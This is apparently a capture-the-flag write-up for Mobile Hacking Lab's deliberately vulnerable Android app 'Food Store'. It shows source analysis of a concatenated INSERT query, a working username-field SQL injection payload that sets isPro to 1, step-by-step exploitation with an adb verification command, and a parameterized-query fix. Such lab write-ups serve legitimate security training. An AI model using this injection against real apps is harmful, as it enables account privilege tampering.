# Food Store — SQL Injection Write-up

**Platform:** Mobile Hacking Lab  
**Category:** Android · SQL Injection  
**Difficulty:** Easy  

---

## Objective

Exploit a SQL Injection vulnerability in the signup function to register as a **Pro User**, bypassing standard user restrictions and gaining 10,000 credits instead of 100.

---

## Source Code Analysis

### 1. Signup Flow — `Signup.java`

The signup button handler collects three user inputs and creates a `User` object:

```java
// Signup.java — onCreate$lambda$0()
User newUser = new User(
    i,                                  // id = 0
    string,                             // username  <- from EditText
    string2,                            // password  <- from EditText
    editText2.getText().toString(),     // address   <- from EditText
    false,                              // isPro     <- HARDCODED to false
    1,
    null
);
dbHelper.addUser(newUser);
```

`isPro` is hardcoded to `false` — a normal signup always creates a Regular user regardless of input.

---

### 2. Database Layer — `DBHelper.java`

The `addUser()` method builds the INSERT query using string concatenation:

```java
// DBHelper.java — addUser()
String encodedPassword = Base64.encodeToString(
    user.getPassword().getBytes(Charsets.UTF_8), 0);   // Base64 encoded

String encodedAddress = Base64.encodeToString(
    user.getAddress().getBytes(Charsets.UTF_8), 0);    // Base64 encoded

String Username = user.getUsername();                   // RAW — not encoded

String sql = "INSERT INTO users (username, password, address, isPro) VALUES ('"
    + Username        + "', '"   // <- INJECTION POINT
    + encodedPassword + "', '"
    + encodedAddress  + "', 0)";

db.execSQL(sql);
```

| Field    | Encoding      | Injectable |
|----------|---------------|------------|
| username | None (raw)    | YES        |
| password | Base64        | No         |
| address  | Base64        | No         |

`username` is the only field inserted raw into the SQL string — this is the injection point.

---

### 3. Database Schema — `DBHelper.java`

```java
db.execSQL(
    "CREATE TABLE users (" +
    "    id       INTEGER PRIMARY KEY AUTOINCREMENT," +
    "    username TEXT," +
    "    password TEXT," +
    "    address  TEXT," +
    "    isPro    INTEGER" +
    ")"
);
```

---

### 4. Login Logic — `LoginActivity.java`

Credits are assigned at login time based on the `isPro` column value:

```java
// LoginActivity.java — onCreate$lambda$1()
User user = this$0.getDbHelper().getUserByUsername(inputUsername);

int credit = user.isPro() ? 10000 : 100;   // Pro = 10,000 | Regular = 100

Intent intent = new Intent(this$0, MainActivity.class);
intent.putExtra("USERNAME",    inputUsername);
intent.putExtra("USER_CREDIT", credit);
intent.putExtra("IS_PRO_USER", user.isPro());
this$0.startActivity(intent);
```

If `isPro = 1` is stored in the database, the user receives **10,000 credits** on login.

---

## Exploitation

### How the Injection Works

The normal SQL executed on signup:

```sql
INSERT INTO users (username, password, address, isPro)
VALUES ('{username}', '{encodedPassword}', '{encodedAddress}', 0)
```

By injecting through the `username` field, the `VALUES` clause is closed early, custom column values are supplied, and the remainder of the original query is commented out with `--`.

---

### Crafting the Payload

Since `password` is stored as Base64 and decoded back at login for comparison, the injected password must be a valid Base64 string.

```
pass  ->  Base64  ->  cGFzcw==
test  ->  Base64  ->  dGVzdA==
```

**Username field payload:**
```
hacker', 'cGFzcw==', 'dGVzdA==', 1) --
```

**Resulting SQL after injection:**
```sql
INSERT INTO users (username, password, address, isPro)
VALUES ('hacker', 'cGFzcw==', 'dGVzdA==', 1) --', '[junk]', '[junk]', 0)
--      ^^^^^^^^  ^^^^^^^^^^  ^^^^^^^^^^  ^
--      username  password    address     isPro = 1
```

The `--` comments out the rest of the original query. A row is inserted with `isPro = 1`.

---

### Steps to Exploit

1. Open the app and navigate to the **Signup screen**.

2. Enter the following values:

    | Field    | Value |
    |----------|-------|
    | Username | `hacker', 'cGFzcw==', 'dGVzdA==', 1) --` |
    | Password | `anything` |
    | Address  | `anything` |

3. Tap **Sign Up**. The toast "User Registered Successfully" confirms the injected row was inserted.

    > *[Screenshot: Signup screen with payload in username field]*

    > *[Screenshot: "User Registered Successfully" toast]*

4. Verify the database to confirm `isPro = 1`:

    ```bash
    adb shell "run-as com.mobilehackinglab.foodstore sqlite3 \
      /data/data/com.mobilehackinglab.foodstore/databases/userdatabase.db \
      'SELECT id, username, isPro FROM users;'"
    ```

    Expected output:
    ```
    1|hacker|1
    ```

    > *[Screenshot: Terminal output showing isPro = 1]*

5. On the **Login screen**, log in with:

    | Field    | Value    |
    |----------|----------|
    | Username | `hacker` |
    | Password | `pass`   |

6. The app opens showing **Pro User** and **10,000 credits**, confirming successful exploitation.

    > *[Screenshot: MainActivity showing Pro User and 10,000 credits]*

---

## Result

Successfully registered and logged in as a Pro User with 10,000 credits by injecting SQL through the username field during signup, bypassing the hardcoded `isPro = false` restriction.

---

## Remediation

Replace raw string concatenation with **parameterized queries**:

```java
// Secure version
SQLiteStatement stmt = db.compileStatement(
    "INSERT INTO users (username, password, address, isPro) VALUES (?, ?, ?, 0)"
);
stmt.bindString(1, user.getUsername());
stmt.bindString(2, encodedPassword);
stmt.bindString(3, encodedAddress);
stmt.executeInsert();
```

With `?` placeholders, user input is always treated as data and never as SQL, making injection impossible regardless of what the user types.
